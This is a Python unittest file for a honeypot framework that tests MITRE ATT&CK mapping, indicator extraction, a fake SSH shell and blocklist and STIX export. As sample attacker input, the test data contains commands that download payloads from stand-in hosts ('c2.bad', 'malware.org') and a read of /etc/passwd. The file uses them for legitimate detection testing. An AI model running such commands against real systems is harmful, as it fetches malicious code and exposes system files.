"""Unit test runner using Python's standard unittest library."""

import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import unittest
from datetime import datetime, timezone
from honeytrap.events import HoneypotEvent, EventType
from honeytrap.analysis.mitre import MITREMapper
from honeytrap.analysis.ioc_extractor import IOCExtractor
from honeytrap.honeypots.ssh_honeypot import FakeShell
from honeytrap.intel.blocklist import BlocklistExporter, AttackerInfo
from honeytrap.intel.stix_export import STIXExporter


class TestMITRE(unittest.TestCase):
    def setUp(self):
        self.mapper = MITREMapper()

    def _event(self, event_type, protocol="ssh", data=None, source_ip="192.0.2.1"):
        return HoneypotEvent(
            id="t1",
            timestamp=datetime.now(timezone.utc),
            sensor_id="test",
            session_id="s1",
            protocol=protocol,
            event_type=event_type,
            source_ip=source_ip,
            source_port=1234,
            data=data or {},
        )

    def test_auth_valid_accounts(self):
        ev = self._event(EventType.AUTH_ATTEMPT, data={"username": "root", "password": "x", "success": True})
        techs = self.mapper.analyze_event(ev)
        self.assertIn("T1078", techs)
        self.assertIn("T1021.004", techs)

    def test_file_discovery(self):
        ev = self._event(EventType.COMMAND, data={"command": "ls -la /tmp"})
        techs = self.mapper.analyze_event(ev)
        self.assertIn("T1083", techs)

    def test_wget_c2(self):
        ev = self._event(EventType.COMMAND, data={"command": "wget http://c2.bad/payload.sh"})
        techs = self.mapper.analyze_event(ev)
        self.assertIn("T1105", techs)
        self.assertIn("T1071.001", techs)

    def test_brute_force(self):
        for i in range(6):
            ev = self._event(EventType.AUTH_ATTEMPT, data={"username": "root", "password": f"p{i}", "success": False}, source_ip="203.0.113.1")
            techs = self.mapper.analyze_event(ev)
        self.assertIn("T1110", techs)


class TestIOCs(unittest.TestCase):
    def setUp(self):
        self.extractor = IOCExtractor()

    def _event(self, event_type=EventType.COMMAND, protocol="ssh", data=None, source_ip="203.0.113.50"):
        return HoneypotEvent(
            id="t2",
            timestamp=datetime.now(timezone.utc),
            sensor_id="test",
            session_id="s2",
            protocol=protocol,
            event_type=event_type,
            source_ip=source_ip,
            source_port=1234,
            data=data or {},
        )

    def test_extract_public_ip(self):
        ev = self._event(source_ip="198.51.100.10")
        iocs = self.extractor.extract_from_event(ev)
        ips = [i.value for i in iocs if i.type == "ip_address"]
        self.assertIn("198.51.100.10", ips)

    def test_filter_private_ip(self):
        ev = self._event(source_ip="192.168.1.10")
        iocs = self.extractor.extract_from_event(ev)
        ips = [i.value for i in iocs if i.type == "ip_address"]
        self.assertNotIn("192.168.1.10", ips)

    def test_extract_url(self):
        ev = self._event(data={"command": "wget https://malware.org/bot.bin"})
        iocs = self.extractor.extract_from_event(ev)
        urls = [i.value for i in iocs if i.type == "url"]
        self.assertTrue(any("malware.org/bot.bin" in u for u in urls))

    def test_extract_creds(self):
        ev = self._event(event_type=EventType.AUTH_ATTEMPT, data={"username": "admin", "password": "pwd"})
        iocs = self.extractor.extract_from_event(ev)
        creds = [i.value for i in iocs if i.type == "credential_pair"]
        self.assertIn("admin:pwd", creds)


class TestSSHShell(unittest.TestCase):
    def test_shell_commands(self):
        shell = FakeShell(username="root")
        self.assertEqual(shell.execute("whoami"), "root")
        self.assertIn("uid=0(root)", shell.execute("id"))
        self.assertIn("Linux", shell.execute("uname -a"))
        self.assertIn("root:", shell.execute("cat /etc/passwd"))
        self.assertIn("command not found", shell.execute("somebadcommand"))
        self.assertIsNone(shell.execute("exit"))


class TestExport(unittest.TestCase):
    def test_blocklist_export(self):
        exp = BlocklistExporter()
        attacker = AttackerInfo(ip="198.51.100.5", country="Testland")
        ipt = exp.export_iptables([attacker])
        self.assertIn("iptables -A INPUT -s 198.51.100.5 -j DROP", ipt)

        nginx = exp.export_nginx([attacker])
        self.assertIn("deny 198.51.100.5;", nginx)

        csv_out = exp.export_csv([attacker])
        self.assertIn("198.51.100.5", csv_out)

    def test_stix_bundle(self):
        exp = STIXExporter()
        bundle = exp.export_bundle([], [{"type": "ip", "value": "198.51.100.9"}], [{"technique_id": "T1110", "name": "Brute Force"}])
        self.assertEqual(bundle["type"], "bundle")
        types = [obj["type"] for obj in bundle["objects"]]
        self.assertIn("identity", types)
        self.assertIn("indicator", types)
        self.assertIn("attack-pattern", types)


if __name__ == "__main__":
    unittest.main()
